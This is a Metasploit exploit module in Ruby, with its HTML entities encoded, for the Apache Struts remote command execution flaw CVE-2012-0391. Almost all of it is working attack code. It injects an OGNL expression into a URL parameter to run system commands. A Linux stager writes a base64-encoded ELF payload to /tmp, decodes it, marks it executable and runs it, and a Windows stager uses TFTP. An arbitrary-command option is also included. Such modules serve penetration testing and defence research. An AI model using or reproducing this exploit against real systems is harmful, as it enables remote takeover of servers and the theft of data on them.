# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::CmdStagerTFTP
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Apache Struts <= 2.2.1.1 Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a remote command execution vulnerability in
        Apache Struts versions < 2.2.1.1. This issue is caused because the
        during certain exception handling for mismatched data types of properties,
        which allows remote attackers to execute arbitrary Java code via a
        crafted parameter.
      },
      &#039;Author&#039;         =>
        [
          &#039;Johannes Dahse&#039;, # Vulnerability discovery and PoC
          &#039;Andreas Nusser&#039;, # Vulnerability discovery and PoC
          &#039;juan vazquez&#039;, # Metasploit module
          &#039;sinn3r&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Version&#039;        => &#039;$Revision: $&#039;,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2012-0391&#039;],
          [ &#039;OSVDB&#039;, &#039;78277&#039;],
          [ &#039;EDB&#039;, &#039;18329&#039;],
          [ &#039;URL&#039;, &#039;https://www.sec-consult.com/files/20120104-0_Apache_Struts2_Multiple_Critical_Vulnerabilities.txt&#039;]
        ],
      &#039;Platform&#039;      => [ &#039;win&#039;, &#039;linux&#039;],
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039;        =>
        [
          [&#039;Windows Universal&#039;,
            {
                &#039;Arch&#039; => ARCH_X86,
                &#039;Platform&#039; => &#039;win&#039;
            }
          ],
          [&#039;Linux Universal&#039;,
            {
                &#039;Arch&#039; => ARCH_X86,
                &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
        ],
      &#039;DisclosureDate&#039; => &#039;Jan 06 2012&#039;,
      &#039;DefaultTarget&#039; => 0))

      register_options(
        [
          Opt::RPORT(8080),
          OptString.new(&#039;TARGETURI&#039;, [ true, &#039;The path to a struts application action and the parameter to inject ie. /HelloWorldStruts2/hello?name=test&id=INJECT&#039;, ""]),
          OptString.new(&#039;CMD&#039;, [ false, &#039;Execute this command instead of using command stager&#039;, "" ])
        ], self.class)
  end

  def execute_command(cmd, opts = {})

    uri = String.new(datastore[&#039;TARGETURI&#039;])
    uri.gsub!(/INJECT/, "&#039;%2b(%23_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Runtime@getRuntime().exec(\"CMD\"))%2b&#039;") if target[&#039;Platform&#039;] == &#039;win&#039;
    uri.gsub!(/INJECT/, "&#039;%2b(%23_memberAccess[\"allowStaticMethodAccess\"]=true,@java.lang.Runtime@getRuntime().exec(\"CMD\".split(\"@\")))%2b&#039;") if target[&#039;Platform&#039;] == &#039;linux&#039;
    uri.gsub!(/CMD/, Rex::Text::uri_encode(cmd))

    vprint_status("Attempting to execute: #{cmd}")

    resp = send_request_raw({
      &#039;uri&#039;     => uri,
      &#039;version&#039; => &#039;1.1&#039;,
      &#039;method&#039;  => &#039;GET&#039;,
    }, 5)

  end

  def windows_stager
    exe_fname = rand_text_alphanumeric(4+rand(4)) + ".exe"

    print_status("Sending request to #{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}")
    execute_cmdstager({ :temp => &#039;.&#039;})
    @payload_exe = payload_exe

    print_status("Attempting to execute the payload...")
    execute_command(@payload_exe)
  end

  def linux_stager
    cmds = "/bin/sh@-c@echo LINE | tee FILE"
    exe = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
    base64 = Rex::Text.encode_base64(exe)
    base64.gsub!(/\=/, "\\u003d")
    file = rand_text_alphanumeric(4+rand(4))

    execute_command("/bin/sh@-c@touch /tmp/#{file}.b64")
    cmds.gsub!(/FILE/, "/tmp/" + file + ".b64")
    base64.each_line do |line|
      line.chomp!
      cmd = cmds
      cmd.gsub!(/LINE/, line)
      execute_command(cmds)
    end

    execute_command("/bin/sh@-c@base64 -d /tmp/#{file}.b64|tee /tmp/#{file}")
    execute_command("/bin/sh@-c@chmod +x /tmp/#{file}")
    execute_command("/bin/sh@-c@rm /tmp/#{file}.b64")

    execute_command("/bin/sh@-c@/tmp/#{file}")
    @payload_exe = "/tmp/" + file
  end

  def on_new_session(client)
    if target[&#039;Platform&#039;] == &#039;linux&#039;
      print_status("Deleting #{@payload_exe} payload file")
      execute_command("/bin/sh@-c@rm #{@payload_exe}")
    else
      print_status("Windows does not allow running executables to be deleted")
      print_status("Delete the #{@payload_exe} file manually after migrating")
    end
  end

  def exploit
    if not datastore[&#039;CMD&#039;].empty?
      print_status("Executing user supplied command")
      execute_command(datastore[&#039;CMD&#039;])
      return
    end

    case target[&#039;Platform&#039;]
      when &#039;linux&#039;
        linux_stager
      when &#039;win&#039;
        windows_stager
      else
        raise RuntimeError, &#039;Unsupported target platform!&#039;
    end

    handler
  end
end



